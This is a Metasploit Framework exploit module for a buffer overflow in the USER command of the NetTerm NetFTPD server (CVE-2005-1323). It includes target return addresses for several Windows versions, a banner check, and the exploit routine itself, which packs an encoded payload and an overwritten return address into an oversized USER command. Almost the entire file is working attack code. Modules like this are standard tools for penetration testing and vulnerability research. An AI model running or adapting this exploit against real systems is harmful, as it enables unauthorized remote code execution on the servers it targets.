##
# $Id: netterm_netftpd_user.rb 10559 2010-10-05 23:41:17Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'NetTerm NetFTPD USER Buffer Overflow',
			'Description'    => %q{
					This module exploits a vulnerability in the NetTerm NetFTPD
				application. This package is part of the NetTerm package.
				This module uses the USER command to trigger the overflow.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10559 $',
			'References'     =>
				[
					[ 'CVE', '2005-1323'],
					[ 'OSVDB', '15865'],
					[ 'URL', 'http://seclists.org/lists/fulldisclosure/2005/Apr/0578.html'],
					[ 'BID', '13396'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x0a\x20\x0d",
					'StackAdjustment' => -3500,
				},
			'Platform'       => [ 'win' ],
			'Targets'        =>
				[
					[
						'NetTerm NetFTPD Universal',  # Tested OK - hdm 11/24/2005
						{
							'Ret'      => 0x0040df98, # netftpd.exe (multiple versions)
						},
					],
					[
						'Windows 2000 English',
						{
							'Ret'      => 0x75022ac4, # ws2help.dll
						},
					],
					[
						'Windows XP English SP0/SP1',
						{
							'Ret'      => 0x71aa32ad, # ws2help.dll
						},
					],
					[
						'Windows 2003 English',
						{
							'Ret'      => 0x7ffc0638, # peb magic :-)
						},
					],
					[
						'Windows NT 4.0 SP4/SP5/SP6',
						{
							'Ret'      => 0x77681799, # ws2help.dll
						},
					],
				],
			'DisclosureDate' => 'Apr 26 2005',
			'DefaultTarget' => 0))
	end

	def check
		connect
		disconnect
		if (banner =~ /NetTerm FTP server/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		# U          push ebp
		# S          push ebx
		# E          inc ebp
		# R          push edx
		# \x20\xC0   and al, al

		buf          = rand_text_english(8192, payload_badchars)
		buf[0, 1]    = "\xc0"
		buf[1, payload.encoded.length] = payload.encoded
		buf[1014, 4] = [ target.ret ].pack('V')

		send_cmd( ["USER #{buf}"] )
		send_cmd( ['HELP'] )

		handler
		disconnect
	end

end
